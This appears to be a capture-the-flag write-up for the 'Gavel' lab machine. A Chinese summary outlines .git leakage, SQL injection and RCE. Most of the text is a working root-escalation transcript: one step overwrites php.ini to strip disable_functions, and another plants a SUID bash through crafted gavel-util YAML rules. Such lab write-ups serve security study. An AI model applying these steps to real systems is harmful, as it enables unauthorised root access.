---
title: Gavel
date: 2025-11-13
weight: -811
tags:
  - linux
  - medium
  - sqli
  - rce
---

![gavel_rank.png](gavel_rank.png)

## 00. 摘要

1. `.git` 文件泄露
2. 代码审计发现 SQL注入与RCE
3. 通过SQL注入拿到admin账号
4. 进入admin页面触发RCE
5. 反弹shell，通过使用 `gavel-util` 覆盖 `php.ini` 进行提权操作

```bash
$ auctioneer@gavel:~$ cat << 'EOF' > fix_ini.yaml
> name: fixini
> description: fix php ini
> image: "x.png"
> price: 1
> rule_msg: "fixini"
> rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
> EOF

$ auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/fix_ini.yaml
Item submitted for review in next auction

$ auctioneer@gavel:~$ cat /opt/gavel/.config/php/php.ini
engine=On
display_errors=On
open_basedir=
disable_functions=

$ auctioneer@gavel:~$ cat << 'EOF' > rootshell.yaml
> name: rootshell
> description: make suid bash
> image: "x.png"
> price: 1
> rule_msg: "rootshell"
> rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
> EOF

$ auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/rootshell.yaml
Item submitted for review in next auction

$ auctioneer@gavel:~$ ls -l /opt/gavel/rootbash
-rwsr-xr-x 1 root root 1396520 Dec  1 05:57 /opt/gavel/rootbash

$ auctioneer@gavel:~$ /opt/gavel/rootbash -p

$ rootbash-5.1# id
uid=1001(auctioneer) gid=1002(auctioneer) euid=0(root) groups=1002(auctioneer),1001(gavel-seller)

```